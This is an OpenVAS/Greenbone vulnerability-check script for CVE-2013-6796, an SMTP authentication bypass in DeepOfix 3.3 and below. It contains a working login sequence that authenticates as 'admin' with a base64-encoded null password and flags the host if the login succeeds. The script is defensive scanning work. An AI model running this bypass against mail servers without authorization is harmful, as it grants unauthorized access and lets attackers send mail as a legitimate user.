if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103833" );
	script_cve_id( "CVE-2013-6796" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-11-19 15:05:15 +0100 (Tue, 19 Nov 2013)" );
	script_name( "DeepOfix SMTP Authentication Bypass" );
	script_category( ACT_ATTACK );
	script_family( "SMTP problems" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "smtpserver_detect.sc" );
	script_require_ports( "Services/smtp", 25 );
	script_mandatory_keys( "smtp/deepofix/detected" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/124054/DeepOfix-3.3-SMTP-Authentication-Bypass.html" );
	script_tag( name: "impact", value: "An Attacker could login in the SMTP server knowing only the username of one user in the
  server and he could sends emails. One important thing is that the user 'admin' always exists in the server." );
	script_tag( name: "vuldetect", value: "Try to bypass authentication for the user 'admin'." );
	script_tag( name: "insight", value: "The vulnerability allows an attacker to bypass the authentication in the SMTP server
  to send emails. The problem is that the SMTP server performs authentication against
  LDAP by default, and the service does not check that the password is null if this
  Base64. This creates a connection 'anonymous' but with a user account without entering
  the password." );
	script_tag( name: "solution", value: "Ask the vendor for an Update or disable 'anonymous LDAP
  bind' in your LDAP server." );
	script_tag( name: "summary", value: "DeepOfix versions 3.3 and below suffer from an SMTP server authentication
  bypass vulnerability due to an LDAP issue." );
	script_tag( name: "affected", value: "DeepOfix 3.3 and below are vulnerable." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("smtp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
port = smtp_get_port( default: 25 );
banner = smtp_get_banner( port: port );
if(!banner || ( !IsMatchRegexp( banner, "^220 [^ ]+ ESMTP$" ) && !ContainsString( banner, "Powered by the new deepOfix Mail Server" ) && !ContainsString( banner, "Welcome to deepOfix" ) )){
	exit( 0 );
}
soc = smtp_open( port: port, data: NULL );
if(!soc){
	exit( 0 );
}
src_name = this_host_name();
send( socket: soc, data: strcat( "EHLO ", src_name, "\r\n" ) );
buf = smtp_recv_line( socket: soc, code: "250" );
if(!buf){
	smtp_close( socket: soc, check_data: buf );
	exit( 0 );
}
send( socket: soc, data: "auth login\r\n" );
buf = smtp_recv_line( socket: soc );
if(!ContainsString( buf, "334 VXNlcm5hbWU6" )){
	smtp_close( socket: soc );
	exit( 0 );
}
send( socket: soc, data: "YWRtaW4=\r\n" );
buf = smtp_recv_line( socket: soc );
if(!ContainsString( buf, "334 UGFzc3dvcmQ6" )){
	smtp_close( socket: soc, check_data: buf );
	exit( 0 );
}
send( socket: soc, data: "AA==\r\n" );
buf = smtp_recv_line( socket: soc );
smtp_close( socket: soc, check_data: buf );
if(ContainsString( buf, "235 nice to meet you" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

